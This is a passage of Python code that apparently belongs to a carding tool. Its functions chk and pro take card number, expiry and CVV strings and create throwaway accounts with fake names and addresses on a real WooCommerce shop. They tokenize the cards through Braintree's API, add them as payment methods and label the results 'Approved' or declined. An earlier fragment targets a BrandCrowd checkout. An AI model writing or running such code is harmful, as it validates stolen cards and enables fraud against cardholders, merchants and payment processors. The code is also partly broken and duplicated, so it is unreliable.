bc-gt-4692-free-logos-2024=gt-4692-excluded; bc-gt-5041-cookie-consent-alternatives=gt-5041-excluded; bc-gt-5292-auth-copy-validity=gt-5292-variation-1',
	    'origin': 'https://www.brandcrowd.com',
	    'referer': 'https://www.brandcrowd.com/checkout/77b446d1-833b-4e33-9b56-71fe5ce24348',
	    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'document',
	    'sec-fetch-mode': 'navigate',
	    'sec-fetch-site': 'same-origin',
	    'sec-fetch-user': '?1',
	    'upgrade-insecure-requests': '1',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
	}
	
	data = {
	    'CartToken': '77b446d1-833b-4e33-9b56-71fe5ce24348',
	    'IsPaymentRequired': 'true',
	    'PayerToken': id,
	    'WalletType': '',
	    'SelectedDiscountCode': '',
	    'SelectedTaxId': '',
	    'PurchaseInstructions': '',
	    'IsFreeTrial': 'false',
	    'UserEmail': 'markkeep72@gmail.com',
	    'ShippingAddress.Name': '',
	    'ShippingAddress.Street1': '',
	    'ShippingAddress.Street2': '',
	    'ShippingAddress.City': '',
	    'ShippingAddress.State': '',
	    'ShippingAddress.ZipCode': '',
	    'ShippingAddress.Country': '',
	    'ShippingAddress.Id': '0',
	    'ShippingAddress.IsPrimary': 'true',
	    'PayerTokenType': 'stripe',
	}
	
	response = requests.post(
	    'https://www.brandcrowd.com/maker/checkout/77b446d1-833b-4e33-9b56-71fe5ce24348',
	    cookies=cookies,
	    headers=headers,
	    data=data,
	)
	last=(response.text)
	soup = BeautifulSoup(last, 'html.parser')	
	if not 'tight">Error</p><' in last:
		if 'success' in last or 'Thank' in last or 'Subscribed' in last:
			return 'success'
	else:
		result = soup.find('p', class_='tw-text-base tw-text-white tw-m-0 tw-leading-tight tw-mb-2 lg:tw-mb-0')
		if result:
			return(result.text)
		else:
			return '#Your card has been declined'
def chk(card):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
		
	user = user_agent.generate_user_agent()
		
	r = requests.session()
	
	r.follow_redirects = True
	
	r.verify = False


		
	def generate_full_name():
				first_names = ["Ahmed", "Mohamed", "Fatima", "Zainab", "Sarah", "Omar", "Layla", "Youssef", "Nour", 
			                   "Hannah", "Yara", "Khaled", "Sara", "Lina", "Nada", "Hassan",
			                   "Amina", "Rania", "Hussein", "Maha", "Tarek", "Laila", "Abdul", "Hana", "Mustafa",
			                   "Leila", "Kareem", "Hala", "Karim", "Nabil", "Samir", "Habiba", "Dina", "Youssef", "Rasha",
			                   "Majid", "Nabil", "Nadia", "Sami", "Samar", "Amal", "Iman", "Tamer", "Fadi", "Ghada",
			                   "Ali", "Yasmin", "Hassan", "Nadia", "Farah", "Khalid", "Mona", "Rami", "Aisha", "Omar",
			                   "Eman", "Salma", "Yahya", "Yara", "Husam", "Diana", "Khaled", "Noura", "Rami", "Dalia",
			                   "Khalil", "Laila", "Hassan", "Sara", "Hamza", "Amina", "Waleed", "Samar", "Ziad", "Reem",
			                   "Yasser", "Lina", "Mazen", "Rana", "Tariq", "Maha", "Nasser", "Maya", "Raed", "Safia",
			                   "Nizar", "Rawan", "Tamer", "Hala", "Majid", "Rasha", "Maher", "Heba", "Khaled", "Sally"] # List of first names
			    
				last_names = ["Khalil", "Abdullah", "Alwan", "Shammari", "Maliki", "Smith", "Johnson", "Williams", "Jones", "Brown",
			                   "Garcia", "Martinez", "Lopez", "Gonzalez", "Rodriguez", "Walker", "Young", "White",
			                   "Ahmed", "Chen", "Singh", "Nguyen", "Wong", "Gupta", "Kumar",
			                   "Gomez", "Lopez", "Hernandez", "Gonzalez", "Perez", "Sanchez", "Ramirez", "Torres", "Flores", "Rivera",
			                   "Silva", "Reyes", "Alvarez", "Ruiz", "Fernandez", "Valdez", "Ramos", "Castillo", "Vazquez", "Mendoza",
			                   "Bennett", "Bell", "Brooks", "Cook", "Cooper", "Clark", "Evans", "Foster", "Gray", "Howard",
			                   "Hughes", "Kelly", "King", "Lewis", "Morris", "Nelson", "Perry", "Powell", "Reed", "Russell",
			                   "Scott", "Stewart", "Taylor", "Turner", "Ward", "Watson", "Webb", "White", "Young"] # List of last names
			    
				full_name = random.choice(first_names) + " " + random.choice(last_names)
				first_name, last_name = full_name.split()

				return first_name, last_name
			
	def generate_address():
		cities = ["New York", "Los Angeles", "Chicago", "Houston", "Phoenix", "Philadelphia", "San Antonio", "San Diego", "Dallas", "San Jose"]
		states = ["NY", "CA", "IL", "TX", "AZ", "PA", "TX", "CA", "TX", "CA"]
		streets = ["Main St", "Park Ave", "Oak St", "Cedar St", "Maple Ave", "Elm St", "Washington St", "Lake St", "Hill St", "Maple St"]
		zip_codes = ["10001", "90001", "60601", "77001", "85001", "19101", "78201", "92101", "75201", "95101"]

		city = random.choice(cities)
		state = states[cities.index(city)]
		street_address = str(random.randint(1, 999)) + " " + random.choice(streets)
		zip_code = zip_codes[states.index(state)]

		return city, state, street_address, zip_code
			
			# Testing the library:
	first_name, last_name = generate_full_name()
	city, state, street_address, zip_code = generate_address()
			
			
			
			
			
	def generate_random_account():
		name = ''.join(random.choices(string.ascii_lowercase, k=20))
		number = ''.join(random.choices(string.digits, k=4))
				
		return f"{name}{number}@gmail.com"
	acc = (generate_random_account())
			
		
	def username():
		name = ''.join(random.choices(string.ascii_lowercase, k=20))
		number = ''.join(random.choices(string.digits, k=20))
				
		return f"{name}{number}"
	username = (username())
			
			
			
	def num():
		number = ''.join(random.choices(string.digits, k=7))
		return f"303{number}"
	num = (num())
			
			
	def generate_random_code(length=32):
		letters_and_digits = string.ascii_letters + string.digits
		return ''.join(random.choice(letters_and_digits) for _ in range(length))
			
	corr = generate_random_code()
			
	sess = generate_random_code()
			
		
	
	
	
	headers = {
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
    'priority': 'u=0, i',
    'referer': 'https://shop.trifectanutrition.com/sign-in/',
    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': user,
}
	
	response = r.get('https://shop.trifectanutrition.com/sign-up/', headers=headers)
	
	headers = {
	    'accept': '*/*',
    'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
    'content-type': 'application/json',
    'newrelic': 'eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjE3MjQwNDciLCJhcCI6IjExMTczMzIxMDIiLCJpZCI6ImJkZDM1NWM4YWYyZjgzMDQiLCJ0ciI6ImZhM2I4ZDhmM2RlYTM0NDg1NDczMDkyZDIwYjIxMTFlIiwidGkiOjE3MjQxOTU1MDk1OTl9fQ==',
    'origin': 'https://shop.trifectanutrition.com',
    'priority': 'u=1, i',
    'referer': 'https://shop.trifectanutrition.com/sign-up/',
    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'traceparent': '00-fa3b8d8f3dea34485473092d20b2111e-bdd355c8af2f8304-01',
    'tracestate': '1724047@nr=0-1-1724047-1117332102-bdd355c8af2f8304----1724195509599',
    'user-agent': user,
}
	
	json_data = {
    'email': acc,
    'password': 'a5520055',
}
	
	response = r.post('https://shop.trifectanutrition.com/wp-json/tf/v1/fb/user/create/email', headers=headers, json=json_data)
	
	headers = {
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
    'priority': 'u=0, i',
    'referer': 'https://shop.trifectanutrition.com/my-account/account-settings/',
    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': user,
}
	
	response = r.get('https://shop.trifectanutrition.com/my-account/edit-address/billing/', cookies=r.cookies, headers=headers)
	
	address = re.search(r'name="woocommerce-edit-address-nonce" value="(.*?)"', response.text).group(1)
	
	
	headers = {
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://shop.trifectanutrition.com',
    'priority': 'u=0, i',
    'referer': 'https://shop.trifectanutrition.com/my-account/edit-address/billing/',
    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
	'user-agent': user,
	}
	
	data = {
    'billing_first_name': first_name,
    'billing_last_name': last_name,
    'billing_country': 'US',
    'billing_address_1': street_address,
    'billing_address_2': '',
    'billing_city': city,
    'billing_state': state,
    'billing_postcode': zip_code,
    'billing_phone': num,
    'billing_email': acc,
    'woocommerce-edit-address-nonce': address,
    '_wp_http_referer': '/my-account/edit-address/billing/',
    'action': 'edit_address',
    'save_address': 'Save address',
}
	
	response = r.post('https://shop.trifectanutrition.com/my-account/edit-address/billing/', cookies=r.cookies, headers=headers, data=data)
	
	
	
	headers = {
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
    'priority': 'u=0, i',
    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
	    'user-agent': user,
	}
	
	response = r.get('https://shop.trifectanutrition.com/my-account/add-payment-method', cookies=r.cookies, headers=headers)
	
	add_nonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text).group(1)
	
	client = re.search(r'client_token_nonce":"([^"]+)"', response.text).group(1)
	
	
	
	headers = {
	    'accept': '*/*',
    'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'newrelic': 'eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjE3MjQwNDciLCJhcCI6IjExMTczMzIxMDIiLCJpZCI6ImJkOWZhODI1OTA4N2JmM2QiLCJ0ciI6ImM4ZmUxODU3ZDQ2OWE4M2E4MmExNTcxOTY0ZDQ1YTZjIiwidGkiOjE3MjQxOTU1NjE2NzR9fQ==',
    'origin': 'https://shop.trifectanutrition.com',
    'priority': 'u=1, i',
    'referer': 'https://shop.trifectanutrition.com/my-account/add-payment-method/',
    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'traceparent': '00-c8fe1857d469a83a82a1571964d45a6c-bd9fa8259087bf3d-01',
    'tracestate': '1724047@nr=0-1-1724047-1117332102-bd9fa8259087bf3d----1724195561674',
    'user-agent': user,
}
		
	data = {
    'action': 'wc_braintree_credit_card_get_client_token',
    'nonce': client,
}
		
	response = r.post('https://shop.trifectanutrition.com/wordpress/wp-admin/admin-ajax.php', cookies=r.cookies, headers=headers, data=data)
	
	enc = response.json()['data']
	
	dec = base64.b64decode(enc).decode('utf-8')
	
	au=re.findall(r'"authorizationFingerprint":"(.*?)"',dec)[0]
	
	
		
	headers = {
		    'accept': '*/*',
    'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
    'authorization': f'Bearer {au}',
    'braintree-version': '2018-05-10',
    'content-type': 'application/json',
    'origin': 'https://assets.braintreegateway.com',
    'priority': 'u=1, i',
    'referer': 'https://assets.braintreegateway.com/',
    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': user,
}
		
	json_data = {
		    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'custom',
        'sessionId': '95a6ff57-7691-4527-9e6a-dc6066499130',
    },
    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
    'variables': {
        'input': {
            'creditCard': {
                'number': n,
                'expirationMonth': mm,
                'expirationYear': yy,
                'cvv': cvc,
            },
            'options': {
                'validate': False,
            },
        },
    },
    'operationName': 'TokenizeCreditCard',
}
		
	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
		
	
	try:
		tok = response.json()['data']['tokenizeCreditCard']['token']
	except:
		return
		
	
	
	headers = {
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://shop.trifectanutrition.com',
    'priority': 'u=0, i',
    'referer': 'https://shop.trifectanutrition.com/my-account/add-payment-method/',
    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': user,
}

		
	data = {
    'payment_method': 'braintree_credit_card',
    'wc-braintree-credit-card-card-type': 'master-card',
    'wc-braintree-credit-card-3d-secure-enabled': '',
    'wc-braintree-credit-card-3d-secure-verified': '',
    'wc-braintree-credit-card-3d-secure-order-total': '0.00',
    'wc_braintree_credit_card_payment_nonce': tok,
    'wc_braintree_device_data': '',
    'wc-braintree-credit-card-tokenize-payment-method': 'true',
    'woocommerce-add-payment-method-nonce': add_nonce,
    '_wp_http_referer': '/my-account/add-payment-method/',
    'woocommerce_add_payment_method': '1',
}
		
	response = r.post('https://shop.trifectanutrition.com/my-account/add-payment-method/', cookies=r.cookies, headers=headers, data=data)
				
			
		
		
		
	text = response.text
		
	pattern = r'Status code (.*?)\s*</li>'
		
	match = re.search(pattern, text)
	if match:
		result = match.group(1)
		if 'risk_threshold' in text:
			result = "RISK: Retry this BIN later."
	else:
		if 'Nice! New payment method added' in text or 'Payment method successfully added.' in text:
			result = "1000: Approved"
		else:
			result = "Error"
	
	if 'funds' in result or 'added' in result or 'FUNDS' in result or 'CHARGED' in result or 'Funds' in result or 'avs' in result or 'postal' in result or 'approved' in result or 'Nice!' in result or 'Approved' in result or 'cvv: Gateway Rejected: cvv' in result or 'does not support this type of purchase.' in result or 'Duplicate' in result or 'Successful' in result or 'Authentication Required' in result or 'successful' in result or 'Thank you' in result or 'confirmed' in result or 'successfully' in result or 'INVALID_BILLING_ADDRESS' in result:
			return 'Approved'
	else:
		return result
def pro(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
		
	user = user_agent.generate_user_agent()
		
	r = requests.session()
	
	r.follow_redirects = True
	
	r.verify = False


		
	def generate_full_name():
				first_names = ["Ahmed", "Mohamed", "Fatima", "Zainab", "Sarah", "Omar", "Layla", "Youssef", "Nour", 
			                   "Hannah", "Yara", "Khaled", "Sara", "Lina", "Nada", "Hassan",
			                   "Amina", "Rania", "Hussein", "Maha", "Tarek", "Laila", "Abdul", "Hana", "Mustafa",
			                   "Leila", "Kareem", "Hala", "Karim", "Nabil", "Samir", "Habiba", "Dina", "Youssef", "Rasha",
			                   "Majid", "Nabil", "Nadia", "Sami", "Samar", "Amal", "Iman", "Tamer", "Fadi", "Ghada",
			                   "Ali", "Yasmin", "Hassan", "Nadia", "Farah", "Khalid", "Mona", "Rami", "Aisha", "Omar",
			                   "Eman", "Salma", "Yahya", "Yara", "Husam", "Diana", "Khaled", "Noura", "Rami", "Dalia",
			                   "Khalil", "Laila", "Hassan", "Sara", "Hamza", "Amina", "Waleed", "Samar", "Ziad", "Reem",
			                   "Yasser", "Lina", "Mazen", "Rana", "Tariq", "Maha", "Nasser", "Maya", "Raed", "Safia",
			                   "Nizar", "Rawan", "Tamer", "Hala", "Majid", "Rasha", "Maher", "Heba", "Khaled", "Sally"] # List of first names
			    
				last_names = ["Khalil", "Abdullah", "Alwan", "Shammari", "Maliki", "Smith", "Johnson", "Williams", "Jones", "Brown",
			                   "Garcia", "Martinez", "Lopez", "Gonzalez", "Rodriguez", "Walker", "Young", "White",
			                   "Ahmed", "Chen", "Singh", "Nguyen", "Wong", "Gupta", "Kumar",
			                   "Gomez", "Lopez", "Hernandez", "Gonzalez", "Perez", "Sanchez", "Ramirez", "Torres", "Flores", "Rivera",
			                   "Silva", "Reyes", "Alvarez", "Ruiz", "Fernandez", "Valdez", "Ramos", "Castillo", "Vazquez", "Mendoza",
			                   "Bennett", "Bell", "Brooks", "Cook", "Cooper", "Clark", "Evans", "Foster", "Gray", "Howard",
			                   "Hughes", "Kelly", "King", "Lewis", "Morris", "Nelson", "Perry", "Powell", "Reed", "Russell",
			                   "Scott", "Stewart", "Taylor", "Turner", "Ward", "Watson", "Webb", "White", "Young"] # List of last names
			    
				full_name = random.choice(first_names) + " " + random.choice(last_names)
				first_name, last_name = full_name.split()

				return first_name, last_name
			
	def generate_address():
		cities = ["New York", "Los Angeles", "Chicago", "Houston", "Phoenix", "Philadelphia", "San Antonio", "San Diego", "Dallas", "San Jose"]
		states = ["NY", "CA", "IL", "TX", "AZ", "PA", "TX", "CA", "TX", "CA"]
		streets = ["Main St", "Park Ave", "Oak St", "Cedar St", "Maple Ave", "Elm St", "Washington St", "Lake St", "Hill St", "Maple St"]
		zip_codes = ["10001", "90001", "60601", "77001", "85001", "19101", "78201", "92101", "75201", "95101"]

		city = random.choice(cities)
		state = states[cities.index(city)]
		street_address = str(random.randint(1, 999)) + " " + random.choice(streets)
		zip_code = zip_codes[states.index(state)]

		return city, state, street_address, zip_code
			
			# Testing the library:
	first_name, last_name = generate_full_name()
	city, state, street_address, zip_code = generate_address()
			
			
			
			
			
	def generate_random_account():
		name = ''.join(random.choices(string.ascii_lowercase, k=20))
		number = ''.join(random.choices(string.digits, k=4))
				
		return f"{name}{number}@gmail.com"
	acc = (generate_random_account())
			
		
	def username():
		name = ''.join(random.choices(string.ascii_lowercase, k=20))
		number = ''.join(random.choices(string.digits, k=20))
				
		return f"{name}{number}"
	username = (username())
			
			
			
	def num():
		number = ''.join(random.choices(string.digits, k=7))
		return f"303{number}"
	num = (num())
			
			
	def generate_random_code(length=32):
		letters_and_digits = string.ascii_letters + string.digits
		return ''.join(random.choice(letters_and_digits) for _ in range(length))
			
	corr = generate_random_code()
			
	sess = generate_random_code()
			
		
	
	
	
	headers = {
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
    'priority': 'u=0, i',
    'referer': 'https://shop.trifectanutrition.com/sign-in/',
    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': user,
}
	
	response = r.get('https://shop.trifectanutrition.com/sign-up/', headers=headers)
	
	headers = {
	    'accept': '*/*',
    'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
    'content-type': 'application/json',
    'newrelic': 'eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjE3MjQwNDciLCJhcCI6IjExMTczMzIxMDIiLCJpZCI6ImJkZDM1NWM4YWYyZjgzMDQiLCJ0ciI6ImZhM2I4ZDhmM2RlYTM0NDg1NDczMDkyZDIwYjIxMTFlIiwidGkiOjE3MjQxOTU1MDk1OTl9fQ==',
    'origin': 'https://shop.trifectanutrition.com',
    'priority': 'u=1, i',
    'referer': 'https://shop.trifectanutrition.com/sign-up/',
    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'traceparent': '00-fa3b8d8f3dea34485473092d20b2111e-bdd355c8af2f8304-01',
    'tracestate': '1724047@nr=0-1-1724047-1117332102-bdd355c8af2f8304----1724195509599',
    'user-agent': user,
}
	
	json_data = {
    'email': acc,
    'password': 'a5520055',
}
	
	response = r.post('https://shop.trifectanutrition.com/wp-json/tf/v1/fb/user/create/email', headers=headers, json=json_data)
	
	headers = {
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
    'priority': 'u=0, i',
    'referer': 'https://shop.trifectanutrition.com/my-account/account-settings/',
    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': user,
}
	
	response = r.get('https://shop.trifectanutrition.com/my-account/edit-address/billing/', cookies=r.cookies, headers=headers)
	
	address = re.search(r'name="woocommerce-edit-address-nonce" value="(.*?)"', response.text).group(1)
	
	
	headers = {
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://shop.trifectanutrition.com',
    'priority': 'u=0, i',
    'referer': 'https://shop.trifectanutrition.com/my-account/edit-address/billing/',
    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
	'user-agent': user,
	}
	
	data = {
    'billing_first_name': first_name,
    'billing_last_name': last_name,
    'billing_country': 'US',
    'billing_address_1': street_address,
    'billing_address_2': '',
    'billing_city': city,
    'billing_state': state,
    'billing_postcode': zip_code,
    'billing_phone': num,
    'billing_email': acc,
    'woocommerce-edit-address-nonce': address,
    '_wp_http_referer': '/my-account/edit-address/billing/',
    'action': 'edit_address',
    'save_address': 'Save address',
}
	
	response = r.post('https://shop.trifectanutrition.com/my-account/edit-address/billing/', cookies=r.cookies, headers=headers, data=data)
	
	
	
	headers = {
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
    'priority': 'u=0, i',
    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
	    'user-agent': user,
	}
	
	response = r.get('https://shop.trifectanutrition.com/my-account/add-payment-method', cookies=r.cookies, headers=headers)
	
	add_nonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text).group(1)
	
	client = re.search(r'client_token_nonce":"([^"]+)"', response.text).group(1)
	
	
	
	headers = {
	    'accept': '*/*',
    'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'newrelic': 'eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjE3MjQwNDciLCJhcCI6IjExMTczMzIxMDIiLCJpZCI6ImJkOWZhODI1OTA4N2JmM2QiLCJ0ciI6ImM4ZmUxODU3ZDQ2OWE4M2E4MmExNTcxOTY0ZDQ1YTZjIiwidGkiOjE3MjQxOTU1NjE2NzR9fQ==',
    'origin': 'https://shop.trifectanutrition.com',
    'priority': 'u=1, i',
    'referer': 'https://shop.trifectanutrition.com/my-account/add-payment-method/',
    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'traceparent': '00-c8fe1857d469a83a82a1571964d45a6c-bd9fa8259087bf3d-01',
    'tracestate': '1724047@nr=0-1-1724047-1117332102-bd9fa8259087bf3d----1724195561674',
    'user-agent': user,
}
		
	data = {
    'action': 'wc_braintree_credit_card_get_client_token',
    'nonce': client,
}
		
	response = r.post('https://shop.trifectanutrition.com/wordpress/wp-admin/admin-ajax.php', cookies=r.cookies, headers=headers, data=data)
	
	enc = response.json()['data']
	
	dec = base64.b64decode(enc).decode('utf-8')
	
	au=re.findall(r'"authorizationFingerprint":"(.*?)"',dec)[0]
	
	
		
	headers = {
		    'accept': '*/*',
    'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
    'authorization': f'Bearer {au}',
    'braintree-version': '2018-05-10',
    'content-type': 'application/json',
    'origin': 'https://assets.braintreegateway.com',
    'priority': 'u=1, i',
    'referer': 'https://assets.braintreegateway.com/',
    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': user,
}
		
	json_data = {
		    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'custom',
        'sessionId': '95a6ff57-7691-4527-9e6a-dc6066499130',
    },
    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
    'variables': {
        'input': {
            'creditCard': {
                'number': n,
                'expirationMonth': mm,
                'expirationYear': yy,
                'cvv': cvc,
            },
            'options': {
                'validate': False,
            },
        },
    },
    'operationName': 'TokenizeCreditCard',
}
		
	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
		
	
	try:
		tok = response.json()['data']['tokenizeCreditCard']['token']
	except:
		return
		
	
	
	headers = {
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://shop.trifectanutrition.com',
    'priority': 'u=0, i',
    'referer': 'https://shop.trifectanutrition.com/my-account/add-payment-method/',
